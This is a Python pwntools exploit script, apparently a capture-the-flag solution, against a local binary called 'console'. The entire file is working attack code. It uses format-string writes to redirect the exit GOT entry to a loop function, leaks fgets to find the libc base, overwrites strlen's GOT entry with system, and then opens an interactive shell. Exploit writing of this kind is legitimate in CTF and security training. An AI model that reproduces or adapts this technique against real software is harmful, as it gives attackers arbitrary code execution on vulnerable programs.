from pwn import *
import sys

elf = ELF('./console')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

LOOP          = elf.symbols['loop']
STRLEN_GOT    = elf.got['strlen']
EXIT_GOT      = elf.got['exit']
FGETS_GOT     = elf.got['fgets']
FGETS_OFFSET  = libc.symbols['fgets']
SYSTEM_OFFSET = libc.symbols['system']
STRLEN_OFFSET = libc.symbols['strlen']

def info(msg):
    log.info(msg)

def leak(addr):
    info("Leaking libc base address")
    payload  = "exit".ljust(8)
    payload += "|%17$s|".rjust(8)
    payload += "blablala"
    payload += p64(addr)
    p.sendline(payload)
    p.recvline()
    data   = p.recvuntil("blablala")
    fgets  = data.split('|')[1]
    fgets  = hex(u64(fgets.ljust(8, "\x00")))
    return fgets

def overwrite(addr, pad):
    payload  = "exit".ljust(8)
    payload += ("%%%du|%%17$hn|" % pad).rjust(16)
    payload += p64(addr)
    p.sendline(payload)
    p.recvline()
    return

def exploit(p):
    info("Overwriting exit with loop")
    pad = (LOOP & 0xffff) - 6
    
    overwrite(EXIT_GOT, pad)
    
    FGETS_LIBC  = leak(FGETS_GOT)
    
    LIBC_BASE   = hex(int(FGETS_LIBC, 16) - FGETS_OFFSET)
    SYSTEM_LIBC = hex(int(LIBC_BASE, 16) + SYSTEM_OFFSET)
    STRLEN_LIBC = hex(int(LIBC_BASE, 16) + STRLEN_OFFSET)
    info("system:   %s" % SYSTEM_LIBC)
    info("strlen:   %s" % STRLEN_LIBC)
    info("libc:     %s" % LIBC_BASE)
    
    WRITELO =  int(hex(int(SYSTEM_LIBC, 16) & 0xffff), 16) - 5
    WRITEHI = int(hex((int(SYSTEM_LIBC, 16) & 0xffff0000) >> 16), 16) - 5
    # call prompt in order to resolve strlen's libc address.
    p.sendline("prompt asdf")
    p.recvline()
    info("Overwriting strlen with system")
    
    overwrite(STRLEN_GOT, WRITELO)
    
    overwrite(STRLEN_GOT+2, WRITEHI)
    
    STRLEN_LIBC_2 = leak(STRLEN_GOT)
    info("strlen2:     %s" % STRLEN_LIBC_2)
    pause()
    p.interactive()

if __name__ == "__main__":
    p = process(['./console', 'log'])
    exploit(p)